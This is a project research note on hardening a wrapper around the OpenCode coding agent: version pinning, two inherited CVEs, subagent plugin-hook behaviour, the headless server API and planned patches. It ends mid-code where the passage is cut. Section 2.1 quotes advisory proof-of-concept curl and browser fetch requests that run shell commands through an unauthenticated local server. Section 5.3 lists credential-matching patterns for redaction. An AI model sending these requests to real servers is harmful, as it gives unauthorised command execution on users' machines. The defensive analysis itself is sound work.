# OpenCode Research Notes

> **Status:** Phase 01 — Prompt 01 (research). Authoritative reference for
> downstream Phase 01 work. Downstream prompts read only this note, not
> upstream source. Every non-obvious claim cites a specific upstream path and
> line number against tag `v1.4.5` (commit `dfc72838d70bea6df14859e90c6df91507b5f406`).
> **Last fetched:** 2026-04-15.
> **Fetch method:** `gh api repos/sst/opencode/contents/...?ref=v1.4.5` against
> the public GitHub API. No local clone was created.

---

## §1 — Version pin

### 1.1 Recommendation

**Pin `opencode-ai@1.4.5`** in `package.json`. Exact version, not a range.

- Hoist any range in `engine/SPEC.md` §15 (`>=1.4.4 <2`) to an exact pin in
  the root `package.json` so `patch-package` always diffs against a known
  tree. Keep the range expression in SPEC.md as the *minimum supported*
  marker.
- Upgrades bump the pin via an explicit PR that re-runs every patch under
  `patches/` and regenerates them if drift is detected.

### 1.2 Evidence

- npm registry query `GET https://registry.npmjs.org/opencode-ai`:
  - `dist-tags.latest = 1.4.5`
  - `dist-tags.latest-1 = 1.1.4` (legacy channel)
  - Last 10 stable `1.x.x` versions: `1.3.14 1.3.15 1.3.16 1.3.17 1.4.0 1.4.1 1.4.2 1.4.3 1.4.4 1.4.5`.
- GitHub tag `v1.4.5` resolves to commit `dfc72838d70bea6df14859e90c6df91507b5f406`.
- `1.4.5` is the first stable release **strictly greater** than `1.4.4`, the
  CVE-2026-22812 floor per SPEC §15 and `engine/CVE-MITIGATION.md §1`.
- `snapshot-*` and `dev` / `beta` channels exist in dist-tags (e.g.
  `beta=0.0.0-beta-202604150220`). **Never** pin to those — unstable by
  design and liable to silently republish.

### 1.3 Resolution assertion at runtime

`engine/src/` must refuse to boot if the resolved `opencode-ai/package.json`
`.version` does not satisfy `>=1.4.4 <2`. Exit code `4`, reason string
`OPENCODE_VERSION_CVE_22812`. This is already specified in SPEC §15 and
CVE-MITIGATION §1.3 — no change needed; Phase 01 Prompt 02 just wires it.

---

## §2 — CVE chain (upstream security fixes inherited)

### 2.1 CVE-2026-22812 — Unauthenticated HTTP server allows arbitrary command execution

- **GHSA:** `GHSA-vxw4-wv6m-9hhh`
- **Published:** 2026-01-12 by `thdxr` (Anomaly Co, a.k.a. sst).
- **Reporter:** `CyberShadow`. Originally emailed to `support@sst.dev`
  2025-11-17 per SECURITY.md; no response — reporter published advisory.
- **Severity:** CVSS v3.1 = **8.8 High**
  (`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`).
- **CWE:** CWE-306 (Missing Auth), CWE-749 (Exposed Dangerous Method),
  CWE-942 (Permissive CORS).
- **Affected:** `opencode-ai < 1.0.216`. **Patched:** `1.0.216`.

#### 2.1.1 Attack vector (verbatim from advisory)

OpenCode auto-starts an HTTP server on default port `4096+` with **no
authentication**. Critical endpoints:

- `POST /session/:id/shell` — execute shell commands (`server.ts:1401` in
  pre-fix tree).
- `POST /pty` — create interactive TTY (`server.ts:267` in pre-fix tree).
- `GET /file/content?path=` — read arbitrary files (`server.ts:1868` in
  pre-fix tree).

Local PoC:

```bash
API="http://127.0.0.1:4096"
SID=$(curl -s -X POST "$API/session" -H "Content-Type: application/json" -d '{}' | jq -r .id)
curl -s -X POST "$API/session/$SID/shell" \
  -H "Content-Type: application/json" \
  -d '{"agent":"build","command":"echo PWNED > /tmp/pwned.txt"}'
```

Browser PoC (Firefox — Chrome 142+ prompts for Local Network Access):

```js
fetch('http://127.0.0.1:4096/session', { method: 'POST', headers: {'Content-Type':'application/json'}, body: '{}' })
  .then(r => r.json())
  .then(s => fetch(`http://127.0.0.1:4096/session/${s.id}/shell`, {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ agent:'build', command:'id > /tmp/pwned.txt' }),
  }));
```

With `--mdns`, the server binds `0.0.0.0` and advertises via Bonjour —
LAN-wide exposure.

#### 2.1.2 Fix chain

- **`1.0.216`** — `AuthMiddleware` added; unauthenticated requests 401.
- **`1.1.10`** — Web UI/API disabled by default; must be explicitly
  re-enabled. (Also the patched floor for CVE-2026-22813 below.)
- **`1.4.4`** — final hardening (per our SPEC).

#### 2.1.3 State in v1.4.5 (what we inherit)

Verified by reading `packages/opencode/src/server/middleware.ts@v1.4.5`
lines 40–54:

```ts
// server/middleware.ts:40
export const AuthMiddleware: MiddlewareHandler = (c, next) => {
  if (c.req.method === "OPTIONS") return next()             // CORS preflight bypass
  const password = Flag.OPENCODE_SERVER_PASSWORD
  if (!password) return next()                              // ← silent fall-through if unset
  const username = Flag.OPENCODE_SERVER_USERNAME ?? "opencode"
  if (c.req.query("auth_token")) c.req.raw.headers.set("authorization", `Basic ${c.req.query("auth_token")}`)
  return basicAuth({ username, password })(c, next)
}
```

Cross-ref: `packages/opencode/src/cli/cmd/serve.ts@v1.4.5` lines 15–17
warns but **does not refuse** to start with no password:

```ts
// cli/cmd/serve.ts
if (!Flag.OPENCODE_SERVER_PASSWORD) {
  console.log("Warning: OPENCODE_SERVER_PASSWORD is not set; server is unsecured.")
}
```

**This is the residual risk we must close.** Upstream accepts "warn and
continue" on empty password. jellyclaw refuses: SPEC §15, CVE-MITIGATION
§1.3 — 256-bit minted-per-session token, mandatory.

#### 2.1.4 CORS policy in v1.4.5 (already tightened)

`packages/opencode/src/server/middleware.ts@v1.4.5` lines 76–92:

```ts
export function CorsMiddleware(opts?: { cors?: string[] }): MiddlewareHandler {
  return cors({
    maxAge: 86_400,
    origin(input) {
      if (!input) return
      if (input.startsWith("http://localhost:")) return input
      if (input.startsWith("http://127.0.0.1:")) return input
      if (input === "tauri://localhost" || input === "http://tauri.localhost" || input === "https://tauri.localhost") return input
      if (/^https:\/\/([a-z0-9-]+\.)*opencode\.ai$/.test(input)) return input
      if (opts?.cors?.includes(input)) return input
    },
  })
}
```

Acceptable: returns nothing for unknown origins → no `Access-Control-Allow-Origin`.
This is already much tighter than the advisory's described `cors()` default.
No jellyclaw patch needed — but we add a `302-no-tauri-origin.patch` to the
roadmap if we ever drop Tauri support (not Phase 01 scope).

#### 2.1.5 Bind default in v1.4.5

`packages/opencode/src/cli/network.ts@v1.4.5` line 12:

```ts
hostname: {
  type: "string" as const,
  describe: "hostname to listen on",
  default: "127.0.0.1",
},
```

And `resolveNetworkOptions` lines 52–56:

```ts
const hostname = hostnameExplicitlySet
  ? args.hostname
  : mdns && !config?.server?.hostname
    ? "0.0.0.0"                                 // ← mDNS path still switches to all-interfaces
    : (config?.server?.hostname ?? args.hostname)
```

So upstream still accepts non-loopback binds when `--mdns` is passed or
`--hostname 0.0.0.0` is explicit. jellyclaw **must never pass `--mdns`** and
**must forbid non-loopback in config** (see §5 Patch 002).

### 2.2 CVE-2026-22813 — XSS in web UI → localhost RCE via /pty

- **GHSA:** `GHSA-c83v-7274-4vgp`
- **Severity:** CVSS v4.0 = **9.4 Critical** (`AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H`).
- **Reporter:** `AlbertSPedersen`.
- **Affected:** `opencode < 1.1.10`. **Patched:** `1.1.10`.
- **Vector:** markdown renderer inserts unsanitized HTML → XSS on
  `http://localhost:4096` → same-origin `fetch('/pty', ...)` → RCE. Also
  exploits `packages/app/src/app.tsx` `?url=` param for session injection.

#### 2.2.1 State at v1.4.5

Not explicitly mentioned in CVE-MITIGATION.md §1 — **update the doc** as a
Phase 01 side-quest (see Risks §6.2). We inherit the fix (pinning ≥1.1.10
is a prerequisite of the ≥1.4.4 floor), but we should document it so future
auditors do not assume "22812 = only CVE."

jellyclaw additionally never starts the web UI and never binds to `4096`
(our server draws ephemeral ports per CVE-MITIGATION §1.3 point 3), so the
XSS-to-RCE chain is structurally inapplicable even if upstream regresses.

---

## §3 — Issue #5894 — subagent hook bypass: deep dive

### 3.1 Status at fetch time

- **URL:** https://github.com/sst/opencode/issues/5894
- **State:** **CLOSED** — auto-closed `2026-04-15T03:04:05Z` by
  `github-actions[bot]` ("automatically closed after 90 days of no activity").
  **No upstream PR was merged.** This is an auto-close, not a resolution.
- **Filed against:** `1.0.182` (2025-12-21).
- **Labels:** `bug`.

### 3.2 Verified conclusions

Three reads were performed at v1.4.5:

1. **Collaborator `rekram1-node` (2025-12-22):** "I don't think this is an
   issue… the subagent is using the bash tool to call the tools." The
   collaborator reproduced `[TestGuardrails] Tool called: bash` on the
   subagent session — meaning hooks **do** fire on subagent tool calls;
   the reporter was shadowed by the fact that the subagent chose `bash`
   and shelled out to `grep`/`glob` rather than calling them as first-class
   tools.

2. **Community investigator `ArmirKS` (2026-02-13), reactions +8/-1:**
   > "When the task tool spawns a subagent it runs its own session through
   > the same prompt loop and plugins are loaded per-Instance so the hooks
   > DO fire for the subagent's tools. What probably happened is the
   > general agent used bash to run grep/glob as shell commands, so
   > `tool.execute.before` only saw `tool: \"bash\"` not `tool: \"grep\"`."
   >
   > "batch.ts calls tool.execute() directly without going through
   > Plugin.trigger(). So any tools called via the batch tool completely
   > bypass plugin hooks."
   >
   > "the tool.execute.before/after calls are duplicated across 3 separate
   > places in prompt.ts (there's even a TODO comment saying 'centralize
   > invoke tool logic'). None of them pass agent info to the hook, so
   > plugins can't even tell which agent triggered the call."

3. **v1.4.5 source audit** confirms (1) and (2):

   - There is **no `packages/opencode/src/tool/batch.ts`** in v1.4.5.
     (Directory listing of `packages/opencode/src/tool/@v1.4.5` enumerated:
     `apply_patch.ts bash.ts codesearch.ts edit.ts external-directory.ts
     glob.ts grep.ts invalid.ts ls.ts lsp.ts mcp-exa.ts multiedit.ts
     plan.ts question.ts read.ts registry.ts schema.ts skill.ts task.ts
     todo.ts tool.ts truncate.ts truncation-dir.ts webfetch.ts
     websearch.ts write.ts`.) The batch blind spot has been removed since
     the community comment was written.
   - `packages/opencode/src/session/prompt.ts@v1.4.5` contains **five**
     `plugin.trigger("tool.execute.*", ...)` call sites — all live on the
     single hot path through which both parent-agent and subagent tool
     calls flow:

     | Line | Kind | Dispatches on |
     |------|------|----------------|
     | 421 / 436 | built-in tool (`tools[item.id]`) — `before` / `after` | every registry tool invocation |
     | 462 / 471 | MCP tool — `before` / `after` | every MCP tool invocation |
     | 584 / 663 | `TaskTool.id` — `before` / `after` | the spawn of a subagent (the task tool itself) |
   - `packages/opencode/src/tool/task.ts@v1.4.5` invokes `ops.prompt(...)`
     for the child session (task.ts:131–150). `ops.prompt` re-enters the
     same `prompt.ts` code path — so the child session goes through the
     **same** 421/436 and 462/471 hook sites. The "fresh empty registry"
     symptom described in our SPEC §5.1 is a pre-1.4.x behavior that has
     since been corrected by upstream via the per-Instance plugin loader
     (`plugin/index.ts` uses `InstanceState.get(state)` — line 271 — so
     hook state is scoped to the Instance/process, not to a session).

### 3.3 Conclusion for Phase 01 patch plan

The **original Patch 001 plan no longer matches reality**. We do not need
to thread a plugin registry into `spawnChild()` because there is no
`spawnChild()` with a fresh empty registry in v1.4.5 — `task.ts` simply
re-invokes the same in-process prompt loop, which already resolves
plugins via the Instance-scoped state.

However, two real gaps remain:

**Gap A — hook site duplication and missing agent context.** The three
different `plugin.trigger("tool.execute.before", ...)` call sites in
`prompt.ts` pass different input shapes, and **none** thread the current
agent identity through. Plugins cannot tell which agent (root vs.
subagent) triggered a given tool call, which is exactly the observability
gap the #5894 reporter hit.

Reference shapes at v1.4.5:

```ts
// prompt.ts:421 — built-in tool
yield* plugin.trigger(
  "tool.execute.before",
  { tool: item.id, sessionID: ctx.sessionID, callID: ctx.callID },
  { args },
)

// prompt.ts:462 — MCP tool
yield* plugin.trigger(
  "tool.execute.before",
  { tool: key, sessionID: ctx.sessionID, callID: opts.toolCallId },
  { args },
)

// prompt.ts:584 — task tool (subagent spawn)
yield* plugin.trigger(
  "tool.execute.before",
  { tool: TaskTool.id, sessionID, callID: part.id },
  { args: taskArgs },
)
```

No `agent`, `parentSessionID`, or `agentChain` field anywhere.

**Gap B — SPEC §5.1 Layer A is misspecified.** `engine/SPEC.md` §5.1 says
our patch touches `packages/opencode/src/session/processor.ts` — in v1.4.5,
`processor.ts` does not handle the tool dispatch loop at all; that lives in
`prompt.ts`. `processor.ts` handles the LLM stream projection. SPEC must
be updated to reference `prompt.ts`.

### 3.4 Revised Patch 001 scope

**Rename:** `001-subagent-hook-fire.patch` → keep the filename (already
committed as a stub, see `patches/001-subagent-hook-fire.patch`), but
update the header to describe the real change:

- Add an `agent: string | undefined` field to the `tool.execute.before`
  and `tool.execute.after` input envelope emitted from `prompt.ts` at the
  three call sites (lines 421, 436, 462, 471, 584, 663, 831, 1244, 1652).
- Thread `input.agent` (already available on the enclosing scope — see
  `prompt.ts:410` where `agent: input.agent` is already captured) into
  each `plugin.trigger(...)` call.
- Diff target: ≤30 LOC net.

This is **forward-compatible** with plugins that do not inspect `agent`
(the field is additive), and it directly fixes the observability bug the
#5894 reporter actually encountered.

**Upstream candidacy:** still `[upstream-candidate]` — this is a general
improvement that benefits every plugin author, not a jellyclaw-specific
concern. Open a PR against sst/opencode when Phase 01 ships.

---

## §4 — Headless server contract

### 4.1 Start command

```bash
opencode serve [--port N] [--hostname 127.0.0.1] [--mdns] [--mdns-domain <domain>] [--cors <origin>...]
```

Source of truth: `packages/opencode/src/cli/cmd/serve.ts@v1.4.5` (24 lines,
quoted in full below).

```ts
// cli/cmd/serve.ts
import { Server } from "../../server/server"
import { cmd } from "./cmd"
import { withNetworkOptions, resolveNetworkOptions } from "../network"
import { Flag } from "../../flag/flag"
// ...
export const ServeCommand = cmd({
  command: "serve",
  builder: (yargs) => withNetworkOptions(yargs),
  describe: "starts a headless opencode server",
  handler: async (args) => {
    if (!Flag.OPENCODE_SERVER_PASSWORD) {
      console.log("Warning: OPENCODE_SERVER_PASSWORD is not set; server is unsecured.")
    }
    const opts = await resolveNetworkOptions(args)
    const server = await Server.listen(opts)
    console.log(`opencode server listening on http://${server.hostname}:${server.port}`)
    await new Promise(() => {})
    await server.stop()
  },
})
```

`Server.listen` lives in `packages/opencode/src/server/server.ts@v1.4.5`
lines 66–106 and returns `{ hostname, port, url, stop }`. mDNS publishes
only when `hostname !== "127.0.0.1" && hostname !== "localhost" && hostname !== "::1"`.

### 4.2 CLI flags

Defined at `packages/opencode/src/cli/network.ts@v1.4.5` lines 5–31:

| Flag | Type | Default | Meaning |
|------|------|---------|---------|
| `--port` | number | `0` (ephemeral; falls back to 4096 if free) | listen port |
| `--hostname` | string | `127.0.0.1` | bind address |
| `--mdns` | boolean | `false` | advertise via Bonjour (**forces `0.0.0.0` bind** unless hostname in config — jellyclaw-forbidden) |
| `--mdns-domain` | string | `opencode.local` | custom mDNS service name |
| `--cors` | string[] | `[]` | extra allowed CORS origins |

### 4.3 Environment variables read by the server

From `packages/opencode/src/flag/flag.ts@v1.4.5`:

| Env var | Read where | Purpose |
|---------|-----------|---------|
| `OPENCODE_SERVER_PASSWORD` | `flag.ts`, used in `server/middleware.ts:43` | Basic-auth password. **If unset, auth middleware is a no-op.** |
| `OPENCODE_SERVER_USERNAME` | `flag.ts`, used in `server/middleware.ts:45` | Basic-auth username (default `"opencode"`). |
| `OTEL_EXPORTER_OTLP_ENDPOINT` | `flag.ts` | Optional OTLP endpoint |
| `OTEL_EXPORTER_OTLP_HEADERS` | `flag.ts` | Optional OTLP headers |

jellyclaw mints its own password per CLI invocation (CVE-MITIGATION §1.3),
so `OPENCODE_SERVER_PASSWORD` **must never be unset** in our environment.

### 4.4 Authentication

`packages/opencode/src/server/middleware.ts@v1.4.5` lines 40–49:

- If `Flag.OPENCODE_SERVER_PASSWORD` is set, `hono/basic-auth` is applied
  with `Authorization: Basic <base64(user:pass)>`.
- CORS preflight (`OPTIONS`) **bypasses auth** — expected per HTTP spec.
- A `?auth_token=<base64>` query parameter is promoted to an
  `Authorization: Basic <token>` header for clients that cannot set
  headers (SSE in browsers). jellyclaw clients SHOULD set the header
  directly rather than using the query fallback.

### 4.5 Routes (mounted in `server/server.ts:37–41`)

```ts
app.route("/", ControlPlaneRoutes())
   .route("/", InstanceRoutes(runtime.upgradeWebSocket))
   .route("/", UIRoutes())
```

`InstanceRoutes` enumerates the route modules under
`packages/opencode/src/server/instance/`:

- `config.ts`       → `/config`, `/config/*`
- `event.ts`        → `/event` (SSE — see §4.6)
- `experimental.ts` → `/experimental/*`
- `file.ts`         → `/find`, `/find/file`, `/file/content` (⚠ CVE-22812 historic vector)
- `global.ts`       → `/global/*`
- `mcp.ts`          → `/mcp/*`
- `permission.ts`   → `/permission/*`
- `project.ts`      → `/project/*`
- `provider.ts`     → `/provider/*`
- `pty.ts`          → `/pty`, `/pty/:id` (⚠ CVE-22813 historic vector)
- `question.ts`     → `/question/*`
- `session.ts`      → `/session`, `/session/:id/*` (message, prompt_async, shell)
- `tui.ts`          → `/tui/*`
- `workspace.ts`    → `/workspace/*`

`httpapi/` holds shared OpenAPI helpers (`index.ts`, `question.ts`).

**jellyclaw's stance:** we consume only `/session`, `/session/:id/message`,
`/session/:id/prompt_async`, `/event`, and `/config`. The others remain
accessible to the loopback origin under the minted password — acceptable
per SPEC §15 threat model but Patch 002 narrows this further.

### 4.6 `/event` SSE contract

Route: `GET /event` — `packages/opencode/src/server/instance/event.ts@v1.4.5`
(90 lines, full).

Response headers set in the handler (lines 38–40):

```
Cache-Control:  no-cache, no-transform
X-Accel-Buffering: no
X-Content-Type-Options: nosniff
Content-Type:   text/event-stream
```

Stream envelope (JSON body of each `data:` SSE event):

```
{ "type": <string>, "properties": <object> }
```

Guaranteed initial frame:

```
data: {"type":"server.connected","properties":{}}
```

Guaranteed heartbeat every 10s:

```
data: {"type":"server.heartbeat","properties":{}}
```

Sample real-event frame types observable on the bus (enumerated from
`Bus.subscribeAll` subscribers across the code base):

- `server.connected`      — once per subscription
- `server.heartbeat`      — every 10s
- `global.disposed`       — Instance shutdown (closes the stream)
- `session.error`         — published at `prompt.ts:531`
- `session.updated`       — `bus.publish(Session.Event.Updated, ...)` path
- `message.updated`       — streaming token deltas
- `message.part.updated`  — tool call parts (input/output/streaming)
- `tool.permission.ask`   — permission prompt request
- `project.updated`       — project metadata change

The `properties` object shape varies per event `type` and is defined by
`BusEvent.define(...)` in the emitter modules. A consumer MUST gate on
`type` before parsing `properties`.

### 4.7 Minimal bootstrap sequence (for `engine/src/bootstrap/opencode-server.ts`)

1. Mint `password = randomBytes(32).toString("hex")` (256-bit per
   CVE-MITIGATION §1.3).
2. Spawn: `execa("npx", ["opencode", "serve", "--hostname", "127.0.0.1", "--port", "0"], { env: { ...process.env, OPENCODE_SERVER_PASSWORD: password, OPENCODE_SERVER_USERNAME: "jellyclaw" }, stdio: "pipe" })`.
3. Read stdout until `opencode server listening on http://127.0.0.1:<port>` is observed; extract `port`.
4. Assert the resolved hostname is `127.0.0.1` and the port is in `[49152, 65535]` (ephemeral range; CVE-MITIGATION §1.3 point 3).
5. Return `{ url: "http://127.0.0.1:<port>", token: base64(username + ":" + password), pid }`.
6. On `SIGTERM`/`SIGINT`, forward to the child and `await` its exit.

---

## §5 — Phase 01 patch plan

Three patches ship in Phase 01, all under `/Users/gtrush/Downloads/jellyclaw-engine/patches/`.
Existing stubs (with header comments) are already committed and match the
naming scheme below.

### 5.1 `001-subagent-hook-fire.patch` — add `agent` context to tool hooks

- **Upstream file:** `packages/opencode/src/session/prompt.ts` (v1.4.5).
- **Approximate line ranges:**
  - 421, 436 — built-in tool before/after
  - 462, 471 — MCP tool before/after
  - 584, 663 — task tool before/after
  - 831        — shell.env hook (already threads `cwd`; leave alone)
  - 1244       — chat.message hook (leave alone)
  - 1652       — chat.params hook (confirm at patch time)
- **Pseudo-diff (illustrative, not exact):**

  ```diff
  // prompt.ts:410  — `input.agent` is in scope already
     agent: input.agent,
   })) {
     const schema = ProviderTransform.schema(input.model, z.toJSONSchema(item.parameters))
     tools[item.id] = tool({
       id: item.id as any,
       ...
       execute(args, options) {
         return run.promise(
           Effect.gen(function* () {
             const ctx = context(args, options)
             yield* plugin.trigger(
               "tool.execute.before",
  -             { tool: item.id, sessionID: ctx.sessionID, callID: ctx.callID },
  +             { tool: item.id, sessionID: ctx.sessionID, callID: ctx.callID, agent: input.agent },
               { args },
             )
             const result = yield* item.execute(args, ctx)
             ...
             yield* plugin.trigger(
               "tool.execute.after",
  -             { tool: item.id, sessionID: ctx.sessionID, callID: ctx.callID, args },
  +             { tool: item.id, sessionID: ctx.sessionID, callID: ctx.callID, args, agent: input.agent },
               output,
             )
  ```

  Repeat symmetrically at the MCP site (line 462/471) and the task-tool
  site (line 584/663). Total net diff ≤30 LOC.

- **Type side-effect:** the `Hooks` interface exported by
  `@opencode-ai/plugin` declares the input types for each trigger.
  Adding `agent` is **additive, optional** — we'll declare it via a tiny
  ambient `.d.ts` override in `engine/src/types/opencode-plugin-overrides.d.ts`
  rather than touching the published plugin package.
- **Expected test signal:** `engine/src/bootstrap/opencode-server.test.ts`
  (Phase 01 Prompt 02) registers a stub plugin that records every
  `tool.execute.before` input, spawns a task tool, and asserts the
  recorded `input.agent` is the subagent's name on nested tool calls.

### 5.2 `002-bind-localhost-only.patch` — refuse non-loopback binds

- **Upstream files:**
  - `packages/opencode/src/cli/network.ts` (v1.4.5, 61 lines) — primary.
  - `packages/opencode/src/server/server.ts` (v1.4.5, lines 66–92) —
    assertion at listen time.
- **Approximate line ranges:**
  - `network.ts:43–56` (`resolveNetworkOptions` body) — refuse
    `hostname !== "127.0.0.1"` unless `--unsafe-bind-all` is passed.
  - `server.ts:83–92` (the `mdns` check / listen bind) — hard-fail if the
    kernel-reported `getsockname()` address is non-loopback.
- **Pseudo-diff:**

  ```diff
  // cli/network.ts:43
   const hostname = hostnameExplicitlySet
     ? args.hostname
     : mdns && !config?.server?.hostname
       ? "0.0.0.0"
       : (config?.server?.hostname ?? args.hostname)
  +
  + if (hostname !== "127.0.0.1" && hostname !== "localhost" && hostname !== "::1") {
  +   if (!args["unsafe-bind-all"]) {
  +     throw new Error(
  +       `refusing to bind ${hostname}: non-loopback binds require --unsafe-bind-all ` +
  +       `(jellyclaw patch 002; see CVE-2026-22812)`,
  +     )
  +   }
  + }
  ```

  Add `"unsafe-bind-all": { type: "boolean" as const, default: false, hidden: true }`
  to the `options` map above so yargs accepts the flag.

- **Expected test signal:** the bootstrap test asserts that launching
  `opencode serve --hostname 0.0.0.0` exits non-zero with the substring
  `jellyclaw patch 002` on stderr.

### 5.3 `003-secret-scrub-tool-results.patch` — redact credentials from tool results

- **Upstream file:** `packages/opencode/src/session/prompt.ts` (v1.4.5),
  the tool-result pipeline just after each `plugin.trigger("tool.execute.after", ...)`.
  - `prompt.ts:438–450` (built-in tool result path)
  - `prompt.ts:472–510` (MCP tool result path — includes textParts loop)
- **Pseudo-diff:**

  ```diff
  + import { Scrub } from "../util/scrub"
  // ...
     yield* plugin.trigger(
       "tool.execute.after",
       { tool: item.id, sessionID: ctx.sessionID, callID: ctx.callID, args, agent: input.agent },
  -    output,
  +    Scrub.scrubToolResult(output),
     )
  ```

  `Scrub.scrubToolResult` is an already-planned jellyclaw module
  (`engine/src/util/scrub.ts`) lifted from the Genie hermes-agent redactor
  (see patch header at `patches/003-secret-scrub-tool-results.patch`).
  Pattern set: `sk-ant-...`, `sk-or-...`, `AKIA[0-9A-Z]{16}`, `github_pat_*`,
  `ghp_*`, `gho_*`, `.env`-style `KEY=VALUE` lines, and the OpenCode server
  password itself (redact any match of the minted-at-boot value).
- **Expected test signal:** a stub tool returns `ANTHROPIC_API_KEY=sk-ant-xxxxxx`;
  the streamed `tool.execute.after` event and the session-persisted message
  part both contain `ANTHROPIC_API_KEY=[REDACTED]`.

### 5.4 Stub alignment check

| File | Current header | Matches plan? |
|------|----------------|----------------|
| `patches/001-subagent-hook-fire.patch` | `[upstream-candidate][security] Fire plugin hooks for subagent tool calls` | **partial** — header says the bug is "task.ts threads no plugin registry." In v1.4.5 that is **no longer true** (plugins are Instance-scoped). Header must be rewritten to describe the `agent`-context improvement from §5.1. |
| `patches/002-bind-localhost-only.patch` | `[upstream-unlikely][security] Force 127.0.0.1 bind; mandatory auth token` | yes |
| `patches/003-secret-scrub-tool-results.patch` | `[upstream-candidate][security] Scrub credential patterns from tool results` | yes |

---

## §6 — Open risks & follow-ups

### 6.1 SPEC / docs drift

SPEC §5.1 still names `packages/opencode/src/session/processor.ts` and
`packages/opencode/src/tool/task.ts` as the #5894 patch targets. Both
claims are obsolete against v1.4.5:

- `task.ts` no longer spawns a child Session with a fresh plugin registry;
  it re-enters the prompt loop via `ops.prompt(...)`, which inherits the
  Instance-scoped plugin state.
- `processor.ts` does not own tool dispatch — that's `prompt.ts`.

**Action (Phase 01 Prompt 02):** update SPEC §5.1 and CVE-MITIGATION.md
before authoring the patch, so the spec tracks the patch rather than the
patch contorting to match stale words.

### 6.2 CVE-MITIGATION.md omits CVE-2026-22813

The doc only covers 22812. 22813 is inherited via the ≥1.1.10 floor and
structurally neutered by jellyclaw's "no web UI, no :4096 bind" stance,
but it should be documented for auditors. **Action:** append a §1.5 to
CVE-MITIGATION.md.

### 6.3 Hook-site duplication upstream

ArmirKS's observation that the hook invocation is triplicated in
`prompt.ts` with a `TODO: centralize invoke tool logic` still stands at
v1.4.5 — we did not find a refactor. If upstream centralizes these sites
in a future release, our Patch 001 will rebase to a single site (good).
Track via a TODO in the patch header.

### 6.4 Auth middleware silent fall-through

`server/middleware.ts:43` — if `OPENCODE_SERVER_PASSWORD` is unset, auth
is a no-op. This is a **known upstream behavior** that our Patch 002 does
not fix (we only lock the bind address). jellyclaw's defense is that
`engine/src/bootstrap/opencode-server.ts` *always* mints a password — but
if a consumer invokes `opencode serve` directly, bypassing our bootstrap,
they are on upstream's behavior. Document in integration guide for Genie.

### 6.5 Lockfile is currently absent

Phase 00 noted there is no `bun.lockb` committed. `bun install` resolves
`opencode-ai: latest` at install time. Between Phase 01 Prompt 01
(research, today) and Phase 01 Prompt 02 (implementation), npm could
publish a `1.4.6`+. **Action for Prompt 02:**
(a) change `package.json` `opencode-ai` from `"latest"` to `"1.4.5"`
exactly, (b) commit `bun.lockb` after the first clean install so
CI — and patch-package — have a reproducible floor.

### 6.6 Patch-package + Bun compatibility

`patch-package` was designed against npm/yarn/pnpm. It works with Bun's
`node_modules/`-layout install (which we are using per `bun install` in
Phase 00), but `postinstall` ordering under Bun is not identical to npm.
Our `package.json` already guards this with `"postinstall": "patch-package || true"`,
which must change to `"postinstall": "patch-package --error-on-fail"`
for Phase 01 — a silently-failed patch is a security regression per
`patches/README.md`. **Action for Prompt 02.**

---

## Appendix A — Upstream source excerpts (verbatim, v1.4.5)

### A.1 `packages/opencode/src/tool/task.ts` (full, 176 lines)

```ts
import { Tool } from "./tool"
import DESCRIPTION from "./task.txt"
import z from "zod"
import { Session } from "../session"
import { SessionID, MessageID } from "../session/schema"
import { MessageV2 } from "../session/message-v2"
import { Agent } from "../agent/agent"
import type { SessionPrompt } from "../session/prompt"
import { Config } from "../config/config"
import { Effect } from "effect"
import { Log } from "@/util/log"

export interface TaskPromptOps {
  cancel(sessionID: SessionID): void
  resolvePromptParts(template: string): Effect.Effect<SessionPrompt.PromptInput["parts"]>
  prompt(input: SessionPrompt.PromptInput): Effect.Effect<MessageV2.WithParts>
}

const id = "task"

const parameters = z.object({
  description: z.string().describe("A short (3-5 words) description of the task"),
  prompt: z.string().describe("The task for the agent to perform"),
  subagent_type: z.string().describe("The type of specialized agent to use for this task"),
  task_id: z.string().describe("...").optional(),
  command: z.string().describe("The command that triggered this task").optional(),
})

export const TaskTool = Tool.define(
  id,
  Effect.gen(function* () {
    const agent = yield* Agent.Service
    const config = yield* Config.Service
    const sessions = yield* Session.Service

    const run = Effect.fn("TaskTool.execute")(function* (params: z.infer<typeof parameters>, ctx: Tool.Context) {
      const cfg = yield* config.get()
      // ...
      const nextSession =
        session ??
        (yield* sessions.create({
          parentID: ctx.sessionID,
          title: params.description + ` (@${next.name} subagent)`,
          permission: [ /* ... denies derived from parent agent ... */ ],
        }))
      // ...
      const ops = ctx.extra?.promptOps as TaskPromptOps
      if (!ops) return yield* Effect.fail(new Error("TaskTool requires promptOps in ctx.extra"))

      const messageID = MessageID.ascending()
      return yield* Effect.acquireUseRelease(
        Effect.sync(() => { ctx.abort.addEventListener("abort", cancel) }),
        () => Effect.gen(function* () {
          const parts = yield* ops.resolvePromptParts(params.prompt)
          const result = yield* ops.prompt({
            messageID,
            sessionID: nextSession.id,
            model: { modelID: model.modelID, providerID: model.providerID },
            agent: next.name,                                     // ← subagent identity here
            tools: { /* tool-visibility filter based on permissions */ },
            parts,
          })
          return { title: params.description, metadata: { sessionId: nextSession.id, model }, output: /* ... */ }
        }),
        () => Effect.sync(() => { ctx.abort.removeEventListener("abort", cancel) }),
      )
    })
    // ...
  }),
)
```

Key observation for §3: the subagent re-enters the same `ops.prompt(...)`
function (line 131 of the full file), which is `SessionPrompt.prompt` in
`prompt.ts`. There is no separate "child dispatcher" — one prompt loop
serves all agents.

### A.2 `packages/opencode/src/session/prompt.ts` — three tool-hook sites

```ts
// prompt.ts:420–436  — built-in tool
execute(args, options) {
  return run.promise(
    Effect.gen(function* () {
      const ctx = context(args, options)
      yield* plugin.trigger(
        "tool.execute.before",
        { tool: item.id, sessionID: ctx.sessionID, callID: ctx.callID },
        { args },
      )
      const result = yield* item.execute(args, ctx)
      const output = { ...result, attachments: result.attachments?.map(...) }
      yield* plugin.trigger(
        "tool.execute.after",
        { tool: item.id, sessionID: ctx.sessionID, callID: ctx.callID, args },
        output,
      )
      if (options.abortSignal?.aborted) input.processor.completeToolCall(options.toolCallId, output)
      return output
    }),
  )
},

// prompt.ts:461–481  — MCP tool
item.execute = (args, opts) =>
  run.promise(
    Effect.gen(function* () {
      const ctx = context(args, opts)
      yield* plugin.trigger(
        "tool.execute.before",
